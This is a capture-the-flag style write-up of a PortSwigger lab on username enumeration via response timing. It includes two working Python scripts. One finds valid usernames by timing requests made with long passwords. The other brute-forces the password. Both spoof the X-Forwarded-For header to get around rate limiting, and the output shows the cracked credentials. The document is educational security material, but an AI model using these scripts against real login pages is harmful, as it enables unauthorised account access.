# Username enumeration via response timing

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing), you'll learn: Username enumeration via response timing! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- Your credentials: `wiener:peter`
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221074715.png)

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221074727.png)

Let's try to login!

**First, what will happened if the username is incorrect?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221074959.png)

**It'll display `Invalid username or password.`, and the response time is 908.72 ms.**

**Then, what will happened if the username is correct?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221075137.png)

Hmm... Pretty much the same.

**How about correct username, but incorrect password with a big blob of strings?**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# openssl rand -hex 200
9b2907492b98ff79176efb184301e2b684fb589acff46462e834a5cf6b0a641d9936923a1fbead46cc07889f059a041ce7a2d86c5b25a3cdfda38560bf3a4bd51dac43db2f793fa2238eb29258a3b764349d2a54e1913ff0a3df981eb25b967cae8710fd6689e9d73ff0b86e784f0c81baf92d10e7dcfd6dfca4e082edf5290b04afb8217d2714c0848aedfdada5795893c60d7289bafeb7268703b164c3cb24bd053339442daed24aa4e66e735487c0834fcfd4060b8ecb3d3b8e873de1fd34b9853dff88879804
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221075427.png)

**Hmm... The response time is 2.6 s!**

**How about incorrect username, and incorrect password with a big blob of strings?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221075531.png)

652.45 ms!

**However, when I was trying to figure out the response time, there is a brute force protection:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221080323.png)

Let's try to bypass that via `X-Forwarded-For` HTTP header:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221080627.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221080653.png)

It worked!

Armed with above information, we can **enumerate username via different response time**!

For example, if **the response time is greater than 3 seconds**, then we will know that **that username is valid**!

**To do so, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep, time
from string import ascii_lowercase
import random

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username, header):
    randomPassword = ''.join(random.choices(ascii_lowercase, k=699))

    loginData = {
        'username': username,
        'password': randomPassword
    }

    startTime = time()
    requests.post(url, cookies=cookie, data=loginData, headers=header)
    endTime = time()
    
    if endTime - startTime >= 3:
        print(f'[+] Found user: {username}')

def main():
    url = 'https://0aff005204396e73c1c2921c00b20071.web-security-academy.net/login'
    cookie = {'session': 'sEn3fhHi3yIfxo6GPvKhovvemLKNGYJT'}

    userFileName = './auth_username.txt'
    listUsername = fetchUsername(userFileName)
    
    count = 0

    for username in listUsername:
        count += 1
        header = {'X-Forwarded-For': '1.1.1.' + str(count)}

        thread = Thread(target=sendRequest, args=(url, cookie, username, header))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_username_time.py
[+] Found user: affiliate
```

- Found user `affiliate`.

**Next, we need to brute force that user's password:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password, header):
    loginData = {
        'username': 'affiliate',
        'password': password
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData, headers=header).text

    if 'Invalid username or password.' not in loginRequestText:
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0aff005204396e73c1c2921c00b20071.web-security-academy.net/login'
    cookie = {'session': 'sEn3fhHi3yIfxo6GPvKhovvemLKNGYJT'}

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    count = 0

    for password in listPassword:
        count += 1
        header = {'X-Forwarded-For': '1.1.2.' + str(count)}

        thread = Thread(target=sendRequest, args=(url, cookie, password, header))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password_time.py
[+] Found password: qwertyuiop
```

- Found user `affiliate` password: `qwertyuiop`

**Let's login as user `affiliate`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221082504.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-5/images/Pasted%20image%2020221221082530.png)

We're user `affiliate`!

# What we've learned:

1. Username enumeration via response timing